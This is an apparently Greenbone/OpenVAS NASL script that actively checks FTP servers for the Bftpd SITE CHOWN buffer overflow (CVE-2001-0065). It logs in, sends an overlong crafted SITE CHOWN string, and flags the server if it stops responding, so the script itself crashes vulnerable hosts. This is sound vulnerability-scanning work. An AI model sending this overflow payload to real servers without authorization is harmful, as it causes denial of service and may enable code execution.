# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bftpd:bftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146592");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2021-08-30 14:04:58 +0000 (Mon, 30 Aug 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2001-0065");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"Workaround");

  script_name("Bftpd <= 1.0.13 Buffer Overflow Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("FTP");
  # nb: Don't add a script_mandatory_keys(), this should run against every Telnet service as
  # requested by a customer.
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"summary", value:"Bftpd is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted SITE CHOWN command and checks if the server
  still responses.");

  script_tag(name:"insight", value:"A buffer overflow allows remote attackers to cause a denial of
  service (DoS) and possibly execute arbitrary commands via a long SITE CHOWN command.");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to crash the FTP
  server or execute arbitrary code on the target machine.");

  script_tag(name:"affected", value:"Bftdp version 1.0.13 and prior. Other products might be
  affected as well.");

  script_tag(name:"solution", value:"See the advisory for a workaround.");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2000-12/0189.html");

  exit(0);
}

include("ftp_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);

if (!soc = ftp_open_socket(port: port))
  exit(0);

creds = ftp_get_kb_creds();
login = creds["login"];
pass = creds["pass"];

if (!ftp_authenticate(socket: soc, user: login, pass: pass)) {
  ftp_close(socket: soc);
  exit(0);
}

cmd = 'SITE CHOWN AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA A\r\n';

send(socket: soc, data: cmd);
ftp_recv_line(socket: soc);

send(socket: soc, data: 'HELP\r\n');
res = ftp_recv_line(socket: soc, retry: 2);
ftp_close(socket: soc);

if (!res) {
  report = 'The FTP server did not respond anymore after executing the following command:\n\n' +
           cmd;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
